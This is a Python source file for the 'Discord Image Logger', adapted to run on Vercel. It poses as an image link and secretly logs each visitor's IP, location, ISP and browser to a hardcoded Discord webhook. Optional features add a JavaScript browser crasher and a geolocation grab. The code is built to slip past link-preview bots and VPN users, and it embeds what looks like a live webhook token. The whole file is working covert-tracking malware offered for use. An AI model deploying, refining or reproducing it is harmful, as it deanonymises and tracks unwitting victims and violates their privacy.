# Discord Image Logger - Vercel Compatible Version
# By DeKrypt | Adapted for Vercel

from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__version__ = "v2.0"

config = {
    "webhook": "https://discord.com/api/webhooks/1507858412900192386/AIgW29HVoKf6StR10P2_1bOXONbg6cVd4Ti6jEoQMfzsIOludq3FOUk_tKrtPSo4HwoI",
    "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "Pwned.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return
    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    if info["hosting"]:
        if config["antiBot"] == 4 and not info["proxy"]: return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2 and not info["proxy"]: ping = ""
        if config["antiBot"] == 1: ping = ""
    os_name, browser = httpagentparser.simple_detect(useragent)
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
{useragent}
}],
    }
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# ========== VERCEL HANDLER ==========

class Response:
    def __init__(self, body="", status_code=200, content_type="text/html", headers=None):
        self.body = body.encode() if isinstance(body, str) else body
        self.status_code = status_code
        self.headers = {"Content-Type": content_type}
        if headers:
            self.headers.update(headers)

class Request:
    def __init__(self, environ):
        self.method = environ.get("REQUEST_METHOD", "GET")
        self.path = environ.get("PATH_INFO", "/")
        self.query_string = environ.get("QUERY_STRING", "")
        self.headers = {}
        for key, value in environ.items():
            if key.startswith("HTTP_"):
                header_name = key[5:].replace("_", "-").title()
                self.headers[header_name] = value
        self.remote_addr = environ.get("REMOTE_ADDR", "")

def handler(request):
    try:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")
        useragent = request.headers.get("User-Agent", "")
        
        params = {}
        if request.query_string:
            params = dict(parse.parse_qsl(request.query_string))

        if config["imageArgument"]:
            b64param = params.get("url") or params.get("id")
            url = base64.b64decode(b64param.encode()).decode() if b64param else config["image"]
        else:
            url = config["image"]

        if ip and ip.startswith(blacklistedIPs):
            return Response("Forbidden", status_code=403)

        bot = botCheck(ip, useragent)
        if bot:
            if config["buggedImage"]:
                makeReport(ip, useragent, endpoint=request.path, url=url)
                return Response(binaries["loading"], content_type="image/jpeg", status_code=200)
            else:
                makeReport(ip, useragent, endpoint=request.path, url=url)
                return Response("", status_code=302, headers={"Location": url})

        data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''

        if config["accurateLocation"]:
            data += """<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var sep = currenturl.includes("?") ? "&" : "?";
            location.replace(currenturl + sep + "g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
        });
    }
}
</script>"""

        if config["crashBrowser"]:
            data += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}},100)</script>'

        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

        if config["message"]["doMessage"]:
            data = config["message"]["message"]

        location = None
        if params.get("g") and config["accurateLocation"]:
            location = base64.b64decode(params["g"].encode()).decode()

        if location:
            makeReport(ip, useragent, location, request.path, url=url)
        else:
            makeReport(ip, useragent, endpoint=request.path, url=url)

        return Response(data, content_type="text/html", status_code=200)

    except Exception:
        reportError(traceback.format_exc())
        return Response("500 - Internal Server Error", status_code=500)

app = handler
